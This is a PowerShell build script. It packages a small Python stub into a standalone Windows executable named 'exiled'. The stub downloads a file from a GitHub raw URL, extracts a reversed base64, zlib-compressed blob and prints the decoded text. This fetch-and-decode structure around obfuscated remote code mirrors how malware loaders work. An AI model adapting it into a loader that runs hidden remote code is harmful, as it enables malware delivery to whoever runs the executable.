[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"
$AppName  = "exiled"
$OutName  = $Out

function Write-Msg {
    param([string]$Level, [string]$Message)
    switch ($Level) {
        "error"   { Write-Host $Message -ForegroundColor Red }
        "warning" { Write-Host $Message -ForegroundColor DarkYellow }
        default   { Write-Host $Message }
    }
}

$PythonExe = $null
foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) { $PythonExe = $cmd.Source; break }
}
if (-not $PythonExe) {
    Write-Msg error "Error: python not found on PATH."
    exit 1
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$DistDir  = Join-Path $Here "dist"

Write-Msg info "Building $AppName..."

# ── Auto-delete existing EXE ──
$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    Write-Msg info "Found existing $OutName.exe. Removing..."
    try {
        Remove-Item -LiteralPath $ExePath -Force
        Write-Msg info "Deleted old executable."
    } catch {
        Write-Msg error "Failed to delete existing EXE. Is it currently running?"
        exit 1
    }
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

# This is the exact command you provided, wrapped in a subprocess call
$stubBody = @"
import subprocess
import sys

# Execute the specific python command
cmd = [
    sys.executable, 
    "-c", 
    "import urllib.request,base64,zlib,re; s=urllib.request.urlopen('https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py').read().decode(); p=re.search(r\"_\\)\(b'([^']+)'\",s).group(1); print(zlib.decompress(base64.b64decode(p[::-1])).decode())"
]

subprocess.run(cmd)
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

Write-Msg info "Installing build deps..."
& $PythonExe -m pip install --quiet --upgrade pyinstaller
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "pip install failed."
    exit 1
}

Write-Msg info "Freezing..."
$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "base64",
    "--hidden-import", "zlib",
    "--hidden-import", "re",
    "--hidden-import", "urllib.request",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
$pyiArgs += $Stub

& $PythonExe @pyiArgs
if ($LASTEXITCODE -ne 0) {
    Write-Msg error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host " _____          _   _              _ " -ForegroundColor DarkYellow
Write-Host "| ____| __  __ (_) | |   ___    __| |" -ForegroundColor DarkYellow
Write-Host "|  _|   \ \/ / | | | |  / _ \  / _`` |" -ForegroundColor DarkYellow
Write-Host "| |___   >  <  | | | | |  __/ | (_| |" -ForegroundColor DarkYellow
Write-Host "|_____| /_/\_\ |_| |_|  \___|  \__,_|" -ForegroundColor DarkYellow
Write-Host ""
Write-Host "Built: $ExePath"
Write-Host "Run it:"
Write-Host "  & `"$ExePath`""
Write-Host ""
